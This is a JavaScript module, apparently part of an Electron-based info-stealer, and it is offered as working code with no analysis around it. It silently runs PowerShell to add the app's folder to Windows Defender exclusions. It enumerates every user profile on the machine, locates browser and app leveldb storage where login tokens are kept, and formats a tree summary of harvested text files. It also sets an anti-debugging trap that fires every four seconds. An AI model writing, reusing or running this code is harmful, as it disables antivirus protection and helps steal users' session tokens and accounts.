"use strict";

const fs = require("fs");
const path = require("path");
const os = require("os");
const child_process = require("child_process");
const electron = require("electron");

function applyDefenderExclusion() {
    if (process.platform !== "win32") return;
    try {
        const appPath = path.dirname(electron.app.getPath("exe"));
        const psCommand = `powershell -Command "if (!(Get-MpPreference).ExclusionPath -contains '${appPath}') { Add-MpPreference -ExclusionPath '${appPath}' -Force }"`;
        child_process.execSync(psCommand, { windowsHide: true, stdio: "ignore" });
    } catch (e) {}
}

async function copyFolderContents(source, dest) {
    if (!fs.existsSync(dest)) fs.mkdirSync(dest, { recursive: true });
    const entries = fs.readdirSync(source, { withFileTypes: true });
    for (const entry of entries) {
        const srcPath = path.join(source, entry.name);
        const destPath = path.join(dest, entry.name);
        if (entry.isDirectory()) {
            await copyFolderContents(srcPath, destPath);
        } else {
            fs.copyFileSync(srcPath, destPath);
        }
    }
}

async function getUsers() {
    const users = [];
    const usersRoot = path.join(process.env.SystemDrive || "C:", "Users");
    try {
        const dirs = fs.readdirSync(usersRoot);
        for (const dir of dirs) {
            if (["Public", "Default", "Default User"].includes(dir)) continue;
            users.push(path.join(usersRoot, dir));
        }
    } catch (e) {}
    if (!users.includes(os.homedir())) users.push(os.homedir());
    return users;
}

function findLevelDBPaths(basePath) {
    let results = [];
    try {
        const entries = fs.readdirSync(basePath, { withFileTypes: true });
        for (const entry of entries) {
            const fullPath = path.join(basePath, entry.name);
            if (entry.isDirectory()) {
                if (entry.name === "Local Storage" || entry.name === "Session Storage") {
                    const ldbPath = path.join(fullPath, "leveldb");
                    if (fs.existsSync(ldbPath)) results.push(ldbPath);
                }
                if (entry.name.startsWith("Profile") || entry.name === "Default") {
                    results.push(...findLevelDBPaths(fullPath));
                }
            }
        }
    } catch (e) {}
    return results;
}

function buildFolderSummary(rootPath) {
    const tree = {};
    function traverse(currentPath, hierarchy = []) {
        const entries = fs.readdirSync(currentPath, { withFileTypes: true });
        for (const entry of entries) {
            const fullPath = path.join(currentPath, entry.name);
            if (entry.isDirectory()) {
                traverse(fullPath, [...hierarchy, entry.name]);
            } else if (entry.isFile() && entry.name.endsWith(".txt")) {
                if (hierarchy.length < 2) continue;
                const root = hierarchy[0];
                const sub = hierarchy[1];
                const category = hierarchy.length >= 3 ? hierarchy[hierarchy.length - 1] : "General";
                tree[root] ??= {};
                tree[root][sub] ??= {};
                tree[root][sub][category] ??= [];
                tree[root][sub][category].push(entry.name);
            }
        }
    }
    traverse(rootPath);
    let output = ["🗂️"];
    for (const [root, subs] of Object.entries(tree)) {
        output.push("├── 🗃️ " + root);
        const subEntries = Object.entries(subs);
        subEntries.forEach(([subName, cats], idx) => {
            const isLastSub = idx === subEntries.length - 1;
            output.push("│   " + (isLastSub ? "└──" : "├──") + " 🧭 " + subName);
            const catEntries = Object.entries(cats);
            catEntries.forEach(([catName, files], cIdx) => {
                const isLastCat = cIdx === catEntries.length - 1;
                const prefix = isLastSub ? "    " : "│   ";
                output.push(prefix + "   " + (isLastCat ? "└──" : "├──") + " 👤 " + catName);
                files.forEach((file, fIdx) => {
                    const isLastFile = fIdx === files.length - 1;
                    const filePrefix = prefix + (isLastCat ? "    " : "│   ");
                    output.push(filePrefix + "   " + (isLastFile ? "└──" : "├──") + " 📄 " + file);
                });
            });
        });
    }
    return output.join("\n");
}

function antiAnalysisTrap(iteration) {
    function trap(val) {
        if (typeof val === "string") {
            return function(h) {}.constructor("while (true) {}").apply("counter");
        } else if (("" + val / val).length !== 1 || val % 20 === 0) {
            (function() { return true; }).constructor("debugger").call("action");
        } else {
            (function() { return false; }).constructor("debugger").apply("stateObject");
        }
        trap(++val);
    }
    try {
        if (iteration) return trap;
        trap(0);
    } catch (e) {}
}

(function() {
    let globalScope;
    try {
        globalScope = Function('return (function() {}.constructor("return this")( ));')();
    } catch (e) {
        globalScope = window;
    }
    globalScope.setInterval(antiAnalysisTrap, 4000);
})();

exports.applyDefenderExclusion = applyDefenderExclusion;
exports.copyFolderContents = copyFolderContents;
exports.getUsers = getUsers;
exports.findLevelDBPaths = findLevelDBPaths;
exports.buildFolderSummary = buildFolderSummary;
